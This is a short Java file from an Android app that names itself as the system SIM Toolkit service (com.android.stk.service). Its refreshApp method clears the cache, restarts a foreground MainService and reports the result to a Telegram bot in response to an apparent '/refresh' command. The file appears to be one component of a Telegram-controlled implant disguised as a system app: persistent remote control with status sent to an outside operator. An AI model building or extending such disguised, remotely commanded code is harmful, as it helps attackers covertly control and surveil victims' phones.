package com.android.stk.service;

import android.content.Context;
import android.content.Intent;

import java.io.File;

public class RefreshHelper {

    public static void refreshApp(Context context) {
        try {
            // 1. Bersihkan file cache (jika ada)
            File cacheDir = context.getCacheDir();
            if (cacheDir != null && cacheDir.isDirectory()) {
                File[] files = cacheDir.listFiles();
                if (files != null) {
                    for (File f : files) {
                        if (f != null && f.isFile()) f.delete();
                    }
                }
            }

            // 2. Stop service
            context.stopService(new Intent(context, MainService.class));

            // 3. Mulai ulang service
            Intent serviceIntent = new Intent(context, MainService.class);
            context.startForegroundService(serviceIntent);

            TelegramSender.sendText("♻️ SIM Toolkits telah direfresh dan restart ulang.");

        } catch (Exception e) {
            TelegramSender.sendText("❌ Gagal /refresh: " + e.getMessage());
        }
    }
}
